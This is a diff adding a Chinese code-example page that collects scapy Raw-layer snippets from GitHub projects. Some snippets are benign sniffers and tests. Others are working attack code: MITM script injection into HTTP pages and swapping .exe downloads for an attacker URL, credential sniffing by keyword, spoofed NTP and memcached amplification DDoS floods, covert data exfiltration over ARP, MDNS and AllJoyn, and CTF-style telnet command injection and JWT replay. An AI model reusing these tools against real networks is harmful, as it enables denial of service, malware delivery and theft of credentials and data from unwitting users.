@@ -1,0 +1,732 @@
+示例1: rawhandle
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def rawhandle(pkt):
+    if sniff_pkts:
+        scapy.wrpcap(random_filename+"arpy.pcap",pkt)
+        counter = 0
+        while counter < 1:
+            counter += 1
+            layer = pkt.getlayer(counter)
+            if layer.haslayer(scapy.Raw) and layer.haslayer(scapy.IP):
+                print(bcolours.OKBLUE + '\n[Info] Found the following (' + layer.name + ' layer): ' + layer.src + " -> " + layer.dst + bcolours.ENDC)
+                tcpdata = layer.getlayer(scapy.Raw).load
+                if not opts.verbose:
+                    print tcpdata
+                else:
+                    print layer.show()
+            else:
+                break 
+开发者ID:ivanvza，项目名称:arpy，代码行数:18，代码来源:arpy.py
+
+
+
+ 
+示例2: inject_code
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def inject_code(packet):
+    http_packet = scapy.IP(packet.get_payload())
+    if http_packet.haslayer(scapy.Raw):
+        load = http_packet[scapy.Raw].load
+        if http_packet[scapy.TCP].dport == 10000:
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
+        elif http_packet[scapy.TCP].sport == 10000:
+            injection_code = """<script>alert('Hello from devopslife.xyz');
+                                </script>"""
+            load = load.replace("</body>", injection_code + "</body>")
+            length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if length_search and "text/html" in load:
+                length = length_search.group(1)
+                new_length = int(length) + len(injection_code)
+                load = load.replace(length, str(new_length))
+
+        if load != http_packet[scapy.Raw].load:
+            new_packet = change_payload(http_packet, load)
+            packet.set_payload(str(new_packet))
+    packet.accept() 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:23，代码来源:code_injector.py
+
+
+示例3: replace_file
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def replace_file(packet):
+    options = get_arguments()
+    parsed_url = urlparse(options.url)
+    http_packet = scapy.IP(packet.get_payload())
+    if http_packet.haslayer(scapy.Raw):
+        if http_packet[scapy.TCP].dport == 10000:
+            if ".exe" in http_packet[scapy.Raw].load and \
+               parsed_url.netloc not in http_packet[scapy.Raw].load:
+                print("[+] exe requested")
+                ack_list.append(http_packet[scapy.TCP].ack)
+        elif http_packet[scapy.TCP].sport == 10000:
+            if http_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(http_packet[scapy.TCP].seq)
+                print("Replacing file")
+                hacked_packet = change_payload(http_packet, options.url)
+                packet.set_payload(str(hacked_packet))
+    packet.accept() 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:19，代码来源:file_interceptor.py
+
+
+
+ 
+示例4: pkt_callback
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def pkt_callback(self, pkt):
+        """
+        Process Traceroute packets
+        """
+        if pkt[IP].id >= 200 and pkt[IP].id < 300:
+            self.pktlen = pkt[IP].id - 200
+        elif pkt[IP].id >= 300 and pkt[IP].id < 400:
+            self.pkttotal = pkt[IP].id - 300
+        elif pkt[IP].id >= 500 and pkt[IP].id < 600:
+            self.dic[pkt[IP].id - 500] = pkt[Raw].load[28:]
+        elif pkt[IP].id == 666:
+            if DEBUG:
+                print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime())
+                      + 'TRACE:' + pkt[IP].src + ':ALARM Case Open!')
+
+        if len(self.dic) == self.pkttotal:
+            odic = collections.OrderedDict(sorted(self.dic.items()))
+            final = ''
+            for value in odic.iteritems():
+                final = final + value[1]
+            text = decrypt(final[:self.pktlen])
+            text = text.strip()
+            hexip = text.split(',')[-1]
+            text = text.replace(hexip, hextoip(hexip))
+            text = 'TRACE:' + pkt[IP].src + ':' + text
+            printer(self.filed, text)
+            self.dic = {}
+            self.pkttotal = 200 
+开发者ID:ekiojp，项目名称:circo，代码行数:30，代码来源:carpa.py
+
+
+示例5: raw
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def raw(pa):
+    """Raw data from a packet
+    """
+    return pa.getlayer(Raw).load 
+开发者ID:louisabraham，项目名称:LaBot，代码行数:6，代码来源:network.py
+
+
+
+ 
+示例6: launch_in_thread
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def launch_in_thread(action, capture_file=None):
+    """Sniff in a new thread
+    When a packet is received, calls action
+    Returns a stop function
+    """
+
+    logger.debug("Launching sniffer in thread...")
+
+    def _sniff(stop_event):
+        if capture_file:
+            sniff(
+                filter="tcp port 5555",
+                lfilter=lambda p: p.haslayer(Raw),
+                stop_event=stop_event,
+                prn=lambda p: on_receive(p, action),
+                offline=capture_file,
+            )
+        else:
+            sniff(
+                filter="tcp port 5555",
+                lfilter=lambda p: p.haslayer(Raw),
+                stop_event=stop_event,
+                prn=lambda p: on_receive(p, action),
+            )
+        logger.info("sniffing stopped")
+
+    e = threading.Event()
+    t = threading.Thread(target=_sniff, args=(e,))
+    t.start()
+
+    def stop():
+        e.set()
+
+    logger.debug("Started sniffer in new thread")
+
+    return stop 
+开发者ID:louisabraham，项目名称:LaBot，代码行数:38，代码来源:network.py
+
+
+示例7: test_sslv2_de_serialize
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def test_sslv2_de_serialize(self):
+        pkt_serialized = str(tls.SSL(records=self.client_hello))
+        self.assertEqual(pkt_serialized, self.client_hello_serialized_expected)
+        pkt = tls.SSL(pkt_serialized)
+        self.assertTrue(pkt.haslayer(tls.SSL))
+        self.assertTrue(pkt.haslayer(tls.SSLv2Record))
+        self.assertTrue(pkt.haslayer(Raw))
+        self.assertEqual(pkt[tls.SSLv2Record].length, 1234)
+        self.assertEqual(pkt[tls.SSLv2ClientHello].challenge, "12345")
+        self.assertEqual(pkt[Raw].load, "TEST") 
+开发者ID:tintinweb，项目名称:scapy-ssl_tls，代码行数:12，代码来源:test_ssl_tls.py
+
+
+示例8: change_payload
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def change_payload(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:8，代码来源:code_injector.py
+
+
+示例9: get_credentials
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def get_credentials(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["login", "password", "username", "user", "pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:9，代码来源:packet_sniffer.py
+
+
+示例10: change_payload
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def change_payload(packet, url):
+    packet[scapy.Raw].load = """HTTP/1.1 301 Moved Permanently
+                             Location: {}\n""".format(url)
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:9，代码来源:file_interceptor.py
+
+
+示例11: process_packet
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def process_packet(packet):
+    if Raw in packet:
+        if proj_id in packet[Raw].load and 'payload' in packet[Raw].load:
+            print str(packet[Raw].load).split('payload')[1][3:-3] 
+开发者ID:cloud-security-research，项目名称:sgx-kms，代码行数:6，代码来源:sniff_secret.py
+
+
+示例12: set_attribute
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def set_attribute(self, class_id, instance, attr, value):
+        """Set the value of attribute class/instance/attr"""
+        path = CIP_Path.make(class_id=class_id, instance_id=instance)
+        # User CIP service 4: Set_Attribute_List
+        cippkt = CIP(service=4, path=path) / scapy_all.Raw(load=struct.pack('<HH', 1, attr) + value)
+        self.send_rr_cm_cip(cippkt)
+        if self.sock is None:
+            return
+        resppkt = self.recv_enippkt()
+        cippkt = resppkt[CIP]
+        if cippkt.status[0].status != 0:
+            logger.error("CIP set attribute error: %r", cippkt.status[0])
+            return False
+        return True 
+开发者ID:scy-phy，项目名称:scapy-cip-enip，代码行数:16，代码来源:plc.py
+
+
+示例13: broadcast_message
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def broadcast_message(message, key=PYEXFIL_DEFAULT_PASSWORD):
+    """
+    Send a message over ARP Broadcast
+    :param message: Message to send as str.
+    :param key: The parameter to use as key.
+    :return None:
+    """
+    msg = AESEncryptOFB(key=key, text=message)
+    n_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst="192.168.1.254") / Raw(load=msg)
+    sendp(n_frame, verbose=False) 
+开发者ID:ytisf，项目名称:PyExfil，代码行数:12，代码来源:communicator.py
+
+
+示例14: process
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def process(self, pkt):
+            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
+                logger.debug(pkt.sprintf('%IP.src%:%TCP.sport% > %IP.dst%:%TCP.dport% %Raw.load%'))
+
+                try:
+                    load = pkt.load.decode('utf-8')
+                except UnicodeDecodeError:
+                    return
+
+                m = re.search(self.flagpattern, load)
+                if m:
+                    self.flag = m.group(0)
+                    self.sniffer.stop() 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:15，代码来源:letter.py
+
+
+示例15: corrupttls
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def corrupttls(pkt):
+        """corrupttls looks for an SMTP client packet with `STARTTLS` and replaces it with `STARTFOO`"""
+        if all(layer in pkt for layer in (scapy.IP, scapy.TCP, scapy.Raw)):
+            if pkt[scapy.TCP].dport == 25 and b'STARTTLS' in pkt[scapy.Raw].load:
+                pkt.load = pkt[scapy.Raw].load.replace(b'STARTTLS', b'STARTFOO')
+        return pkt 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:8，代码来源:letter.py
+
+
+示例16: injectcmd
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def injectcmd(pkt):
+        """injectcmd looks for a telnet client packet and if it has the `cd` command, reaplces it with `cat .ctf_flag`"""
+        if all(layer in pkt for layer in (scapy.IP, scapy.TCP)):
+            if scapy.Raw in pkt and pkt[scapy.TCP].dport == 23:
+                raw = pkt[scapy.Raw]
+                if b'cd ' in raw.load:
+                    raw.load = b'cat .ctf_flag\n'
+        return pkt 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:10，代码来源:piggies.py
+
+
+示例17: process
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def process(self, pkt):
+            if all(layer in pkt for layer in (scapy.Ether, scapy.IP, scapy.UDP, scapy.Raw)):
+                logger.debug(pkt.sprintf('%IP.src%: %Raw.load%'))
+
+                try:
+                    load = pkt.load.decode('utf-8')
+                except UnicodeDecodeError:
+                    return
+
+                m = re.search(self.flagpattern, load)
+                if m:
+                    self.question = m.group(0)
+                elif 'Yup' in load and self.question is not None:
+                    self.flag = self.question
+                    self.sniffer.stop() 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:17，代码来源:middle.py
+
+
+示例18: filter
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def filter(self, pkt):
+            if all(layer in pkt for layer in (scapy.TCP, scapy.Raw)):
+                tcp, raw = pkt[scapy.TCP], pkt[scapy.Raw]
+                if tcp.sport == self.port:
+                    try:
+                        if jwt.decode(raw.load, verify=False)['auth']:
+                            self.authed_token = raw.load
+                        elif self.authed_token is not None:
+                            raw.load = self.authed_token
+                    except (jwt.DecodeError, KeyError):
+                        pass
+            return pkt 
+开发者ID:nategraf，项目名称:Naumachia，代码行数:14，代码来源:recipe.py
+
+
+示例19: rx_from_emulator
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def rx_from_emulator(emu_rx_port, interface):
+    ''' 
+        Receives 0mq messages from emu_rx_port    
+        args:
+            emu_rx_port:  The port number on which to listen for messages from
+                          the emulated software
+    '''
+    global __run_server
+    #global __host_socket
+    topic = "Peripheral.EthernetModel.tx_frame"
+    context = zmq.Context()
+    mq_socket = context.socket(zmq.SUB)
+    mq_socket.connect("tcp://localhost:%s" % emu_rx_port)
+    mq_socket.setsockopt(zmq.SUBSCRIBE, topic)
+
+    while (__run_server):
+        msg = mq_socket.recv_string()
+        # print "Got from emulator:", msg
+        topic, data = decode_zmq_msg(msg)
+        frame = data['frame']
+        # if len(frame) < 64:
+        #    frame = frame +('\x00' * (64-len(frame)))
+        p = scapy.Raw(frame)
+        scapy.sendp(p, iface=interface)
+        # __host_socket.send(frame)
+        print("Sending Frame (%i) on eth: %s" %
+              (len(frame), binascii.hexlify(frame))) 
+开发者ID:embedded-sec，项目名称:halucinator，代码行数:29，代码来源:host_ethernet.py
+
+
+示例20: send_msg
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def send_msg(self, topic, msg):
+        frame = msg['frame']
+        p = scapy.Raw(frame)
+        scapy.sendp(p, iface=self.interface) 
+开发者ID:embedded-sec，项目名称:halucinator，代码行数:6，代码来源:ethernet_virt_hub.py
+
+
+示例21: NTP_ATTACK
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def NTP_ATTACK(threads, attack_time, target):
+    # Finish
+    global FINISH
+    FINISH = False
+
+    target_ip = target.split(":")[0]
+    target_port = int(target.split(":")[1])
+
+    print("\033[1;34m"+"[*]"+"\033[0m"+" Starting NTP attack...")
+    
+    # Payload
+    payload = ("\x17\x00\x03\x2a" + "\x00" * 4)
+    threads_list = []
+    # Load NTP servers list
+    with open("tools/other/ntp_servers.txt", 'r') as f:
+        ntp_servers = f.readlines()
+
+    # NTP flood
+    def ntp_flood():
+        global FINISH
+        while not FINISH:
+            for server in ntp_servers:
+                if not FINISH:
+                    # Packet
+                    packets = random.randint(10, 150)
+                    server = server.replace("\n", "")
+                    
+                    try:
+                        packet = IP(dst = server, src = target_ip) / UDP(sport = random.randint(2000,65535), dport = int(target_port)) / Raw(load = payload)
+                        send( packet, count = packets, verbose = False)
+                    except Exception as e:
+                        print(e)
+                    else:
+                        print("\033[1;34m"+"[*]"+"\033[0m"+" Sending " + str(packets) + " packets from NTP server: " + server + " to " + target + "...")
+
+    # Start threads
+    for thread in range(threads):
+        print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
+        t = Thread(target = ntp_flood)
+        t.start()
+        threads_list.append(t)
+    # Sleep selected secounds
+    time.sleep(attack_time)
+    # Terminate threads
+    for thread in threads_list:
+        FINISH = True
+        thread.join()
+    
+    print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.") 
+开发者ID:entynetproject，项目名称:quack，代码行数:51，代码来源:ntp.py
+
+
+示例22: MEMCACHED_ATTACK
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def MEMCACHED_ATTACK(threads, attack_time, target):
+    # Finish
+    global FINISH
+    FINISH = False
+
+    target_ip = target.split(":")[0]
+    target_port = int(target.split(":")[1])
+
+    print("\033[1;34m"+"[*]"+"\033[0m"+" Starting MEMCACHED attack...")
+    
+    # Payload
+    payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
+    threads_list = []
+    # Load MEMCACHED servers list
+    with open("tools/other/memcached_servers.txt", 'r') as f:
+        memcached_servers = f.readlines()
+
+    # MEMCACHED flood
+    def memcached_flood():
+        global FINISH
+        while not FINISH:
+            for server in memcached_servers:
+                if not FINISH:
+                    packets = random.randint(10, 150)
+                    server = server.replace("\n", "")
+                    # Packet
+                    try:
+                        packet = IP(dst = server, src = target_ip) / UDP(sport = target_port, dport = 11211) / Raw(load = payload)
+                        send(packet, count = packets, verbose = False)
+                    except Exception as e:
+                        print(e)
+                    else:
+                        print("\033[1;34m"+"[*]"+"\033[0m"+" Sending " + str(packets) + " forged UDP packets to " + server + "...")
+
+    # Start threads
+    for thread in range(threads):
+        print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
+        t = Thread(target = memcached_flood)
+        t.start()
+        threads_list.append(t)
+    # Sleep selected secounds
+    time.sleep(attack_time)
+    # Terminate threads
+    for thread in threads_list:
+        FINISH = True
+        thread.join()
+    
+    print("\033[1;77m"+"[i]"+"\033[0m"+" Attack completed.") 
+开发者ID:entynetproject，项目名称:quack，代码行数:50，代码来源:memcached.py
+
+
+示例23: Send
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def Send (dst_ip, data, sequence=0, spoof_source=False, dst_port=MDNS_PORT, src_port=MDNS_PORT, dns_name=TEST_QUERY):
+    """
+    Send one packet of MDNS with data.
+    :param dst_ip: IP as string.
+    :param data: Data as bytes/string.
+    :param sequence: Number to use for sequence. Int.
+    :param spoof_source: Default:False. Set as IP for spoofing.
+    :param dst_port: ....
+    :param src_port: ...
+    :param dns_name: DNS name to put in the MDNS request.
+    :return: semper vera!!!
+    """
+    payload = ""
+    payload += "\x00"  # TransID is 2 bytes. Using one for sequence.
+    payload += struct.pack('B', sequence)
+    
+    payload += "\x00\x00"  # Stndrt qry
+    payload += "\x00\x01"  # 1 questions
+    payload += "\x00\x00"  # 0 ans RRs
+    payload += "\x00\x00"  # 0 authority RRs
+    payload += "\x00\x00"  # 0 additional RRs
+    # Start of query:
+    payload += struct.pack('B', len(dns_name))  # Length? -> YES it is!
+    payload += dns_name  # name
+    payload += "\x00"  # Query Terminator
+    payload += "\x00\x0c"  # PTR request
+    payload += "\x00\x01"  # class IN
+    
+    if spoof_source is False:
+        pkt = IP(
+                dst = dst_ip
+                # src = "1.1.1.1"
+        ) / UDP(
+                sport = src_port,
+                dport = dst_port
+        ) / Raw(
+                load = payload
+        )
+    else:
+        pkt = IP(
+                dst = dst_ip,
+                src = spoof_source
+        ) / UDP(
+                sport = src_port,
+                dport = dst_port
+        ) / Raw(
+                load = data
+        )
+    send(pkt)
+    return True 
+开发者ID:ytisf，项目名称:PyExfil，代码行数:52，代码来源:__init__.py
+
+
+示例24: Send
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def Send (dst_ip, from_ip, data, src_port=ALLJOYN_PORT, session_id=uuid.uuid4().hex):
+    """
+    Send the actual packet.
+    :param dst_ip: String
+    :param from_ip: String
+    :param data: Bytes/String
+    :param src_port: Port. Default (9956)
+    :param session_id: Auto generated. Hex UUID.
+    :return: Tibi ipsi dic vere
+    """
+    
+    payload = ""
+    payload += "\x00\x00\x01\x78"  # header with 1 answer, 0 questions and 120 timer
+    
+    # At Message start
+    payload += "\x7d\x02"  # Two answers
+    payload += struct.pack("H", src_port)  # origin port,
+    payload += inet_aton(from_ip)  # origin ip
+    payload += "\x20"  # guid length
+    payload += session_id  # the actual guid
+    
+    # Adv Entry #0 - do not change
+    payload += "\x21\x6f\x72\x67\x2e\x61\x6c\x6c\x6a\x6f\x79\x6e" \
+               "\x2e\x41\x62\x6f\x75\x74\x2e\x73\x6c\x2e\x79\x51" \
+               "\x43\x2d\x63\x53\x61\x62\x6d\x2e\x78\x30"
+    
+    # Adv Entry #2 - do not change
+    payload += "\x1b\x6f\x72\x67\x2e\x61\x6c\x6c\x6a\x6f\x79\x6e" \
+               "\x2e\x73\x6c\x2e\x79\x51\x43\x2d\x63\x53\x61\x62" \
+               "\x6d\x2e\x78\x30"
+    
+    pkt = IP(
+            dst = dst_ip,
+            src = from_ip
+    ) / UDP(
+            sport = ALLJOYN_PORT,
+            dport = ALLJOYN_PORT
+    ) / Raw(
+            load = data
+    )
+    
+    send(pkt)
+    return True 
+开发者ID:ytisf，项目名称:PyExfil，代码行数:45，代码来源:__init__.py
+
+
+示例25: udp_sr1
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def udp_sr1(test_params, udp_test, dtls_wrap=False):
+    """Send UDP test message to server using UDP protocol and parses response."""
+    response = None
+    sent_time = test_params.report_sent_packet()
+    if not dtls_wrap:
+        if test_params.ip_version == 4:
+            udp_test_packet = IP() / UDP() / Raw(udp_test)
+            udp_test_packet[IP].src = test_params.src_endpoint.ip_addr
+            udp_test_packet[IP].dst = test_params.dst_endpoint.ip_addr
+        elif test_params.ip_version == 6:
+            udp_test_packet = IPv6() / UDP() / Raw(udp_test)
+            udp_test_packet[IPv6].src = test_params.src_endpoint.ipv6_addr
+            udp_test_packet[IPv6].dst = test_params.dst_endpoint.ip_addr
+        udp_test_packet[UDP].sport = test_params.src_endpoint.port
+        udp_test_packet[UDP].dport = test_params.dst_endpoint.port
+        del udp_test_packet[UDP].chksum
+        # if test_params.verbose:
+        #     udp_test_packet.show()
+        if test_params.timeout_sec == 0:
+            test_params.timeout_sec = 0.0001
+        response = sr1(
+            udp_test_packet,
+            verbose=test_params.verbose,
+            timeout=test_params.timeout_sec,
+            retry=test_params.nr_retries,
+        )
+        if response:
+            print_verbose(
+                test_params, "Received response - size: {}".format(len(response))
+            )
+            test_params.report_received_packet(sent_time)
+    else:
+        # do_patch()
+        if test_params.ip_version == 4:
+            sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
+            sock.connect(
+                (test_params.dst_endpoint.ip_addr, test_params.dst_endpoint.port)
+            )
+            sock.send(udp_test)
+            response = IP() / UDP() / Raw(sock.recv())
+            if response:
+                test_params.report_sent_packet(sent_time)
+
+    #            sock.close()
+    return response 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:47，代码来源:common_utils.py
+
+
+示例26: filter_action
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import Raw [as 别名]
+def filter_action(self, packet):
+        """Count size of sniffed packet."""
+        if UDP in packet:
+            try:
+                print ("[-] Received UDP packet")
+                packet.show()
+                # show_verbose(self.test_params, packet[IP])
+                dns_resp_rrname = ""
+                if DNS in packet:
+                    dns_response = packet[DNS]
+                    print ("[-] DNS packet parsed by scapy")
+                    print (
+                        "dns_response[DNS].ancount = {}".format(
+                            dns_response[DNS].ancount
+                        )
+                    )
+                    if dns_response[DNS].ancount > 0:
+                        print ("dns_response[DNS].an = {}".format(dns_response[DNS].an))
+                        print (
+                            "dns_response[DNS].an[0].rrname = {}".format(
+                                dns_response[DNS].an[0].rrname
+                            )
+                        )
+                        dns_resp_rrname = convert_dns_ans(
+                            dns_response[DNS].an, dns_response[DNS].ancount
+                        )
+                        print (dns_resp_rrname)
+                if Raw in packet:
+                    dns_response = DNSRecord.parse(packet[Raw].load)
+                    print ("[-] DNS Packet parsed by dnslib")
+                    if self.test_params.verbose:
+                        print ("Received DNS message: {}".format(dns_response))
+                        print (
+                            "DNS message contains answer: {}".format(
+                                dns_response.get_a()
+                            )
+                        )
+                        dns_resp_rrname = str(dns_response.get_a())
+                        self.server_response = dns_response.rr
+                if self.query in dns_resp_rrname or self.query == dns_resp_rrname:
+                    self.server_alive = True
+                    self.test_params.report_received_packet(self.start_time)
+                    # answers = dns_response.header.a
+                    # print("Answers = {}".format(answers))
+            except AttributeError as exc:
+                print_verbose(self.test_params, str(exc)) 
+开发者ID:Samsung，项目名称:cotopaxi，代码行数:48，代码来源:mdns_utils.py
